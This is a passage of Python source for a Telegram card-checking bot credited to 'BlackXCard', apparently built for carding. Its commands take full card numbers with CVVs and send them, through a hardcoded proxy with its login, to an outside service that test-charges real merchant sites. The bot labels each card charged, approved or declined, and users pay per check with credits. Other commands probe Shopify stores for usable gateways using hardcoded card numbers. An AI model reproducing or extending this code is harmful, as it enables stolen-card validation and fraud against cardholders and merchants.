            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /pp")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass







import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
PY_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def py_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = PY_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = PY_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/py card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Ensure month is 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_py(update, context, payload))







import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True


# --- HC Processor ---
import aiohttp
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
ADYEN_API = "https://autoshopify.stormx.pw/index.php"
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
ADYEN_DEFAULT_SITE = "https://pizazzhair.com"

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

async def process_ad(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /ad command: check Adyen card, display response and BIN info.
    Gateway label = Adyen, Price = 1$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:  # ✅ PEHLA try: block
        user = update.effective_user
        
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits left.")
            return
        
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text("❌ Invalid format. Use: /ad card|mm|yy|cvv")
            return
        
        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)
        
        msg = await update.message.reply_text("⏳")
        
        api_url = (
            f"{ADYEN_API}"
            f"?site={ADYEN_DEFAULT_SITE}"            
            f"&cc={full_card}"            
            f"&proxy={DEFAULT_PROXY}"
        )
        
        # ❌ DOOSRA try: block HATA DO
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response ---
        try:  # ✅ Yeh alag try block JSON parsing ke liye
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = "Adyen"
        price = "1$"

        # --- BIN lookup safely ---
        try:  # ✅ Yeh alag try block BIN lookup ke liye
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester & Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine response emojis + header ---
        display_response = escape(response)
        resp_upper = response.upper()

        if "THANK YOU" in resp_upper:
            header_status = "𝘾𝙃𝘼𝙍𝙂𝙀 💎"
            display_response += "𝘾𝙃𝘼𝙍𝙂𝙀 💎"
        elif re.search(r"\b(ORDER_PLACED|CHARGED|SUCCESS)\b", resp_upper, re.I):
            header_status = "𝘾𝙃𝘼𝙍𝙂𝙀 💎"
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif "3D_AUTHENTICATION" in resp_upper:
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
            display_response += " 🔒"
        elif any(x in resp_upper for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "CARD_DECLINED" in resp_upper:
            header_status = "❌ DECLINED"
        else:
            header_status = "❌ DECLINED"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘼𝙙𝙮𝙚𝙣 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:  # ✅ Pehle try: block ka except
        await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
        return
    except Exception as e:  # ✅ Pehle try: block ka except
        logger.exception("Error in processing /ad")
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass


import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
AD_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def ad_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = AD_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = AD_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no card input ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/ad card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Ensure month is 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_ad(update, context, payload))



import re
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telegram command: /add <site_url1> <site_url2> ..."""
    user = update.effective_user
    user_id = user.id

    if not context.args:
        await update.message.reply_text("❌ Format: /add site1.com site2.com")
        return

    # Get current sites from database
    user_data = await get_user(user_id)
    if not user_data:
        await update.message.reply_text("❌ User not found in database.")
        return
    
    current_sites = user_data.get("custom_urls", [])
    if current_sites is None:
        current_sites = []
    
    response_lines = []
    new_sites_added = []
    duplicate_sites = []
    
    for raw_site in context.args:
        site = raw_site.strip()
        
        if not site:
            continue
        
        # Skip numbers like 1., 2., etc.
        if site.replace(".", "").isdigit():
            continue
        
        # Skip if too short
        if len(site) < 4:
            continue
        
        # Clean site
        site = site.lower()
        
        # Fix common issues
        site = site.replace("https://https://", "https://")
        site = site.replace("http://https://", "https://")
        site = site.replace("https://http://", "http://")
        
        # Format site properly
        if site.startswith(("http://", "https://")):
            formatted_site = site
        elif site.startswith("www."):
            formatted_site = f"https://{site}"
        elif "." in site and not site.split(".")[0].isdigit():
            formatted_site = f"https://{site}"
        else:
            continue
        
        # Clean up
        if formatted_site.endswith("/"):
            formatted_site = formatted_site[:-1]
        
        # Check if site already exists (case insensitive)
        formatted_lower = formatted_site.lower()
        site_exists = False
        
        for existing_site in current_sites:
            if existing_site.lower() == formatted_lower:
                site_exists = True
                break
        
        if site_exists:
            display_site = formatted_site.replace("https://", "").replace("http://", "")
            duplicate_sites.append(display_site)
        else:
            # Add to list
            current_sites.append(formatted_site)
            new_sites_added.append(formatted_site)
            display_site = formatted_site.replace("https://", "").replace("http://", "")
            response_lines.append(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙣𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {display_site}")
    
    # Update database if new sites were added
    if new_sites_added:
        try:
            # Debug print
            print(f"DEBUG: Updating user {user_id} with sites: {current_sites}")
            
            # Update database
            success = await update_user(user_id, custom_urls=current_sites)
            
            if not success:
                await update.message.reply_text("❌ Database update failed.")
                return
                
        except Exception as e:
            print(f"DEBUG: Database error: {e}")
            await update.message.reply_text(f"❌ Database error: {e}")
            return
    
    # Add duplicate sites to response
    for dup_site in duplicate_sites:
        response_lines.append(f"⚠️ 𝙎𝙞𝙩𝙚 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩: {dup_site}")
    
    # Send response
    if response_lines:
        final_message = "\n".join(response_lines)
        await update.message.reply_text(final_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    else:
        await update.message.reply_text("❌ No valid sites provided.")

async def mysites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for /mysites - shows all sites added by the user."""
    user_id = update.effective_user.id
    
    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.message.reply_text("❌ User not found in database.")
        return
    
    # Get sites list
    sites = user_data.get("custom_urls", [])
    if sites is None:
        sites = []
    
    # Debug print
    print(f"DEBUG: User {user_id} has sites: {sites}")
    
    if not sites:
        await update.message.reply_text(
            "❌ You have not added any sites yet.\nUse <b>/add &lt;site_url&gt;</b> to add one.",
            parse_mode="HTML"
        )
        return
    
    # Format message
    total_sites = len(sites)
    formatted_sites = f"<b>𝙎𝙞𝙩𝙚𝙨 ⇾ {total_sites}</b>\n"
    formatted_sites += "━━━━━━━━━━━━━━━━━━\n"
    
    # Create sites list
    sites_list = ""
    for i, site in enumerate(sites, start=1):
        # Clean display
        display_site = site.replace("https://", "").replace("http://", "")
        sites_list += f"{i}. {display_site}\n"
    
    # Send message
    await update.message.reply_text(
        f"{formatted_sites}\n<pre>{sites_list}</pre>",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )








import time
import re
import json
import asyncio
import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from html import escape
from db import get_user, update_user   # DB functions

# Cooldown tracker
last_site_usage = {}

# ===== Updated API template =====
API_TEMPLATE = (
    "https://autoshopify.stormx.pw/index.php"
    "?cc=4312311807552605|08|2031|631"
    "&site={site_url}"
    "&proxy=pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
)

# --- Error patterns marking site dead ---
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "PY ID EMPTY",
    "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY"
]

# === Credit system ===
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# === Main command ===
async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # === Cooldown check ===
    now = time.time()
    if user_id in last_site_usage and (now - last_site_usage[user_id]) < 3:
        await update.message.reply_text(
            "⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 3 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 /𝘀𝗶𝘁𝗲 𝗮𝗴𝗮𝗶𝗻."
        )
        return
    last_site_usage[user_id] = now

    # === Credit check ===
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use this command.")
        return

    # === Argument check ===
    if not context.args:
        await update.message.reply_text(
            "❌ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘜𝘙𝘓.\n"
            "Example:\n<code>/check https://example.com</code>",
            parse_mode=ParseMode.HTML
        )
        return

    site_url = context.args[0].strip()
    if not site_url.startswith(("http://", "https://")):
        site_url = "https://" + site_url

    # Initial message
    msg = await update.message.reply_text(
        f"⏳ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝒔𝒊𝒕𝒆: <code>{escape(site_url)}</code>...",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Run checker in background
    asyncio.create_task(run_site_check(site_url, msg, user))


# === Background worker ===
async def run_site_check(site_url: str, msg, user):
    api_url = API_TEMPLATE.format(site_url=site_url)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=120, headers={"User-Agent": "Mozilla/5.0"}) as resp:
                raw_text = await resp.text()

        # --- Extract JSON part if wrapped in HTML ---
        clean_text = re.sub(r'<[^>]+>', '', raw_text).strip()
        json_start = clean_text.find('{')
        if json_start != -1:
            clean_text = clean_text[json_start:]

        try:
            data = json.loads(clean_text)
        except json.JSONDecodeError:
            await msg.edit_text(
                f"❌ Invalid API response:\n<pre>{escape(raw_text[:500])}</pre>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract fields ---
        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Shopify")
        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        # --- Error pattern check ---
        resp_upper = str(response).upper()
        dead_reason = None
        for pattern in ERROR_PATTERNS:
            if pattern in resp_upper:
                dead_reason = pattern
                break

        if dead_reason:
            status = "𝘿𝙚𝙖𝙙 ❌"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{dead_reason}</b></i>"
        elif price_float > 0:
            status = "𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ✅"
            price_display = f"<i><b>💲{price_float:.1f}</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"
        else:
            status = "𝘿𝙚𝙖𝙙 ❌"
            price_display = "<i><b>💲0.0</b></i>"
            response_display = f"<i><b>{escape(str(response))}</b></i>"

        # --- Format info ---
        requester = f"@{user.username}" if user.username else str(user.id)
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
        BULLET_GROUP_LINK = "tg://resolve?domain=BlinkCarder"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        formatted_msg = (
            f"◇━━〔 #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 〕━━◇\n\n"
            f"{bullet_link} 𝐒𝐢𝐭𝐞       ➵ <code>{escape(site_url)}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➵ <i><b>{escape(gateway)}</b></i>\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➵ {response_display}\n"
            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭      ➵ {price_display} 💸\n"
            f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬      ➵ <b>{status}</b>\n\n"
            f"────────✧────────\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
            f"────────✧────────"
        )

        await msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await msg.edit_text(
            "❌ Error: API request timed out. Try again later.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )




import asyncio
import aiohttp
import time
import re
import json
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.error import TelegramError
from db import get_user, update_user

API_TEMPLATE = (
    "https://autoshopify.stormx.pw/index.php"
    "?site={site_url}&cc=5547300001996183|11|2028|197"
    "&proxy=pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
)

MSITE_CONCURRENCY = 3
MSITE_COOLDOWN = 5
last_msite_usage = {}

# --- Error patterns that mark site as dead (case-insensitive) ---
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "PY ID EMPTY",
    "TAX AMMOUNT EMPTY",
    "R4 TOKEN EMPTY"
]

# --- Credit system ---
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

def normalize_site(site: str) -> str:
    site = site.strip()
    if not site.startswith("http://") and not site.startswith("https://"):
        site = "https://" + site
    return site

# --- Fetch site info (with error pattern check) ---
async def fetch_site_info(session, site_url: str):
    normalized_url = normalize_site(site_url)
    api_url = API_TEMPLATE.format(site_url=normalized_url)
    try:
        async with session.get(api_url, timeout=60) as resp:
            raw_text = await resp.text()

        # Clean and locate JSON
        clean_text = re.sub(r"<[^>]+>", "", raw_text).strip()
        json_start = clean_text.find("{")
        if json_start != -1:
            clean_text = clean_text[json_start:]

        data = json.loads(clean_text)

        response = str(data.get("Response", "Unknown"))
        gateway = data.get("Gateway", "Shopify")

        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        # --- Error pattern detection (case-insensitive, overrides everything) ---
        resp_upper = response.upper()
        for pattern in ERROR_PATTERNS:
            if pattern.upper() in resp_upper:
                return {
                    "site": normalized_url,
                    "price": 0.0,
                    "status": "dead",
                    "response": response,
                    "gateway": gateway,
                }

        # If no error pattern matched → decide by price
        status = "working" if price_float > 0 else "dead"

        return {
            "site": normalized_url,
            "price": price_float,
            "status": status,
            "response": response,
            "gateway": gateway,
        }

    except Exception as e:
        return {
            "site": site_url,
            "price": 0.0,
            "status": "dead",
            "response": f"Error: {str(e)}",
            "gateway": "N/A",
        }

# --- Mass site checker ---
async def run_msite_check(sites: list[str], msg):
    total = len(sites)
    results = [None] * total
    counters = {"checked": 0, "working": 0, "dead": 0, "amt": 0.0}
    semaphore = asyncio.Semaphore(MSITE_CONCURRENCY)

    async with aiohttp.ClientSession() as session:

        async def worker(idx, site):
            async with semaphore:
                res = await fetch_site_info(session, site)
                results[idx] = res
                counters["checked"] += 1
                if res["status"] == "working":
                    counters["working"] += 1
                    counters["amt"] += res["price"]
                else:
                    counters["dead"] += 1

                # --- Summary header ---
                summary = (
                    "<pre><code>"
                    f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                    f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : {counters['working']}\n"
                    f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                    f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                    f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : ${counters['amt']:.1f}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "</code></pre>"
                )

                # --- Only Working site details ---
                working_lines = []
                for r in results:
                    if not r:
                        continue
                    if r["status"] != "working" or r["price"] <= 0:
                        continue
                    # safeguard: skip if response has error pattern
                    resp_upper = r["response"].upper()
                    if any(pat.upper() in resp_upper for pat in ERROR_PATTERNS):
                        continue
                    display_site = (
                        r["site"]
                        .replace("https://", "")
                        .replace("http://", "")
                        .replace("www.", "")
                    )
                    working_lines.append(
                        f"✅ <code>{escape(display_site)}</code>\n"
                        f"   ⤷ <i><b>💲{r['price']:.1f}</b></i> ┃ <i><b>{r['gateway']}</b></i> ┃ <i><b>{r['response']}</b></i>"
                    )

                details = ""
                if working_lines:
                    details += (
                        f"\n\n📝 <b>𝑾𝒐𝒓𝒌𝒊𝒏𝒈 𝑺𝒊𝒕𝒆𝒔</b>\n"
                        f"────────────────\n" + "\n".join(working_lines) + "\n────────────────"
                    )

                content = summary + details

                try:
                    await msg.edit_text(
                        content,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                except TelegramError:
                    pass

        # --- Run all workers concurrently ---
        tasks = [asyncio.create_task(worker(i, s)) for i, s in enumerate(sites)]
        await asyncio.gather(*tasks)

        # --- Final check if no working sites ---
        if counters["working"] == 0:
            final_content = (
                "<pre><code>"
                f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : 0\n"
                f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : $0.0\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "❌ No working sites found."
                "</code></pre>"
            )
            try:
                await msg.edit_text(
                    final_content,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
            except TelegramError:
                pass

# --- /msite command handler ---
async def msite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telegram command: /msite <site1> <site2> <site3> ... (max 5 sites)"""
    user = update.effective_user
    user_id = user.id

    if not context.args:
        await update.message.reply_text(
            "❌ 𝙐𝙨𝙖𝙜𝙚: /𝙢𝙨𝙞𝙩𝙚 {𝙨𝙞𝙩𝙚1} {𝙨𝙞𝙩𝙚2} {𝙨𝙞𝙩𝙚3}...\n"
            "Example: /msite site1.com site2.com site3.com",
            parse_mode=ParseMode.HTML
        )
        return

    sites_input = context.args
    if len(sites_input) > 5:
        await update.message.reply_text("❌ Maximum 5 sites allowed at once.")
        return

    # Format sites with https://
    formatted_sites = []
    for site in sites_input:
        if not site.startswith(("http://", "https://")):
            site = f"https://{site}"
        formatted_sites.append(site)

    processing_msg = await update.message.reply_text(
        f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 {len(formatted_sites)} 𝓼𝓲𝓽𝓮𝓼...",
        parse_mode=ParseMode.HTML
    )

    # Run background worker
    asyncio.create_task(
        process_msite(user, user_id, formatted_sites, processing_msg)
    )

async def process_msite(user, user_id, sites_list, processing_msg):
    """
    Background worker that adds multiple sites and checks each one
    """
    BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
    bullet_text = "⩙"
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
    DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
    DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    # --- Error patterns ---
    ERROR_PATTERNS = [
        "CLINTE TOKEN",
        "DEL AMMOUNT EMPTY", 
        "PRODUCT ID IS EMPTY",
        "PY ID EMPTY",
        "TAX AMMOUNT EMPTY",
        "R4 TOKEN EMPTY",
        "Receipt ID is empty"
    ]

    results = []
    added_sites = []
    
    # Fetch current sites
    user_data = await get_user(user_id)
    current_sites = user_data.get("custom_urls", []) or []

    for site_url in sites_list:
        try:
            # --- API setup ---
            import urllib.parse
            encoded_site = urllib.parse.quote_plus(site_url)
            encoded_proxy = urllib.parse.quote_plus("pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2")
            
            api_url = (
    f"https://autoshopify.stormx.pw/index.php"
    f"?site={encoded_site}"
    f"&cc=4610460320383664|09|29|688"           
    f"&proxy={encoded_proxy}"
)
            # --- API request ---
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    api_url,
                    timeout=30,
                    headers={"User-Agent": "Mozilla/5.0"}
                ) as resp:
                    raw_text = await resp.text()

            # --- Parse API response ---
            try:
                data = json.loads(raw_text)
            except json.JSONDecodeError:
                results.append(f"❌ {site_url} - Invalid API response")
                continue

            response = data.get("Response", "Unknown")
            gateway = data.get("Gateway", "Shopify Normal")

            try:
                price_float = float(data.get("Price", 0))
            except (ValueError, TypeError):
                price_float = 0.0

            # --- Error pattern detection ---
            resp_upper = str(response).upper()
            dead_reason = None
            for pattern in ERROR_PATTERNS:
                if pattern.upper() in resp_upper:
                    dead_reason = pattern
                    break

            if dead_reason:
                results.append(f"❌ {site_url} - {dead_reason}")
            elif price_float > 0:
                results.append(f"✅ {site_url} - ${price_float:.1f}")
                # Add to user's sites if not already present
                if site_url not in current_sites:
                    current_sites.append(site_url)
                    added_sites.append(site_url)
            else:
                results.append(f"❌ {site_url} - Dead")

        except Exception as e:
            results.append(f"❌ {site_url} - Error: {str(e)}")

    # Update user's sites in DB
    if added_sites:
        await update_user(user_id, custom_urls=current_sites)

    # Format final message
    result_text = "\n".join(results)
    requester = f"@{user.username}" if user.username else str(user.id)

    final_msg = (
        f"◇━━〔 <b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b> 〕━━◇\n"
        f"{bullet_link} <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝</b> ➵ {len(sites_list)}\n"
        f"{bullet_link} <b>𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐀𝐝𝐝𝐞𝐝</b> ➵ {len(added_sites)}\n"
